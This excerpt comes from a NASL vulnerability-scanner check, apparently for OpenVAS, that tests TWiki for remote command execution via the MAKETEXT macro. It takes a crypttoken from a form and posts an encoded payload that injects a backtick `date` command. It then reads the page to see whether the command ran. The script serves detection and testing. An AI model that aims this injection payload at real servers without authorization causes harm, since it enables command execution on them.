...
if(!twikiPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: twikiPort )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
...
if(!IsMatchRegexp( res1, "^HTTP/1\\.[01] 200" ) || !ContainsString( res1, "name=\"crypttoken\" value=\"" )){
	exit( 0 );
}
crypt_token = eregmatch( pattern: "name=\"crypttoken\" value=\"([0-9a-f]*)\"", string: res1 );
if(!crypt_token[1]){
	exit( 0 );
}
...
post_data = NASLString( "crypttoken=", crypt_token, "&text=VT-Test%20%25", "MAKETEXT%7B%22APt%20%5B_1%5D%20rxCsi%5C%5C'%7D%3B%20%60date", "%60%3B%20%7B%20%23%22%20args%3D%22QpR%22%7D%25" );
...
req3 = NASLString( "GET ", url3, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Cookie: TWIKISID=\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: 0\\r\\n\\r\\n" );
res3 = http_keepalive_send_recv( port: twikiPort, data: req3 );
url4 = dir + "/save" + sandbox_page;
post_data = NASLString( "crypttoken=", crypt_token, "&text=OV-Test" );
req4 = NASLString( "POST ", url4, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Cookie: TWIKISID=", cookie, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", ( strlen( post_data ) ), "\\r\\n\\r\\n", post_data );
res4 = http_keepalive_send_recv( port: twikiPort, data: req4 );
if(IsMatchRegexp( res1, "^HTTP/1\\.[01] 200" ) && !ContainsString( res3, "}; `date`; {" ) && egrep( string: res3, pattern: ">VT-Test</a></span> HASH\\(0x" )){
